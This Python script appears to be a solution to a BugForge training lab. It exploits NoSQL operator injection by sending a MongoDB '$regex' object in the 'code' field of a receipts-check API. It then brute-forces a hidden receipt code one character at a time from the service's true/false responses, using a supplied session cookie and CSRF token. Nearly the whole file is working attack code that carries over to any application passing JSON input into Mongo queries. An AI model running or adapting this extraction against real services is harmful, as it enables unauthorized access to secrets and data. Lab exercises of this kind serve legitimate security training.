#!/usr/bin/env python3

import requests
import string
import time
import sys

# Replace with your current lab url
BASE_URL = "https://lab-1794574965944-krfyu9.labs-app.bugforge.io"
SHIPMENT_REF = "RB-7731-KM"

# Replace with your current lab session values
SESSION_COOKIE = "YOUR_RELAYBOX_SESSION"
CSRF_TOKEN = "YOUR_CSRF_TOKEN"

CHECK_URL = f"{BASE_URL}/api/receipts/check"

# Alphanumeric characters
ALPHABET = string.digits + string.ascii_uppercase + string.ascii_lowercase

# Known prefix
prefix = "RBX-"

# Maximum code length, including RBX-
MAX_LENGTH = 30

session = requests.Session()
session.cookies.set("relaybox_session", SESSION_COOKIE)

session.headers.update({
    "Content-Type": "application/json",
    "Origin": BASE_URL,
    "Referer": BASE_URL + "/",
    "X-CSRF-Token": CSRF_TOKEN,
})

def check_regex(pattern):
    payload = {
        "shipmentRef": SHIPMENT_REF,
        "code": {"$regex": pattern}
    }

    response = session.post(
        CHECK_URL,
        json=payload,
        timeout=15
    )

    response.raise_for_status()
    return response.json().get("valid", False)


print(f"[*] Target shipment: {SHIPMENT_REF}")
print(f"[*] Initial prefix: {prefix}")

while len(prefix) <= MAX_LENGTH:

    # Check whether we have recovered the complete code
    if check_regex("^" + prefix + "$"):
        print(f"\n[+] Receipt code recovered: {prefix}")
        break

    found = False

    for char in ALPHABET:
        candidate = prefix + char

        if check_regex("^" + candidate):
            prefix = candidate
            print(f"[+] Found character: {char}")
            print(f"[+] Current code: {prefix}")

            found = True
            break

        time.sleep(0.05)

    if not found:
        print("\n[-] No matching character found.")
        print("[-] Check the alphabet, prefix, or maximum length.")
        sys.exit(1)

else:
    print("[-] Maximum length reached.")

print("\n[*] Finished.")